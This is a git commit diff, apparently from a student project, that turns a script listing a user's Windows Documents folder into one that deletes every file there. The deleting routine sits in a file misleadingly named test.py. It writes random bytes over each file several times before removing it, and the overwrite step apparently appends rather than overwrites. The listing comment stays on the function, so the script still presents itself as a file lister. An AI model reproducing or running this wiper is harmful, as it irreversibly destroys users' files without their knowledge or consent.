ac0a522448a127348b9b8a0290af8e3bfcb623c5
Erick García <erick_sonico@ciencias.unam.mx>
2024-11-18 15:57:26 -0600

    Elimina archivos de Documents

--- src/files.py
+++ src/files.py
@@ -1,11 +1,17 @@
 import os
+import test
 
-def listar_archivos_documentos():
+
+archivos = []
+# Para listar los archivos en la carpeta Documents del usuario
+def listar_archivos_documentos(lista):
     documentos_path = os.path.join(os.environ["USERPROFILE"], "Documents")
-
-    print(f"Archivos en la carpeta Documentos ({documentos_path}):")
     for root, _, files in os.walk(documentos_path):
         for file in files:
-            print(os.path.join(root, file))
+            lista.append(os.path.join(root, file))
 
-listar_archivos_documentos()
+listar_archivos_documentos(archivos)
+
+for archivo in archivos:
+    print(archivo)
+    test.secure_delete(archivo)
---
+++ src/test.py
@@ -0,0 +1,21 @@
+import os
+
+def secure_delete(file_path, passes=3):
+    try:
+        if os.path.exists(file_path):
+            # Sobrescribir el archivo con datos aleatorios
+            with open(file_path, 'ba+') as f:
+                length = f.tell()  # Obtener tamaño del archivo
+                for _ in range(passes):
+                    f.seek(0)  # Volver al inicio del archivo
+                    f.write(os.urandom(length))  # Escribir datos aleatorios
+                    f.flush()
+            
+            # Borrar el archivo después de sobrescribir
+            os.remove(file_path)
+            print(f"El archivo {file_path} ha sido eliminado de forma segura.")
+        else:
+            print(f"El archivo {file_path} no existe.")
+    except Exception as e:
+        print(f"Error al intentar borrar el archivo de forma segura: {e}")
+
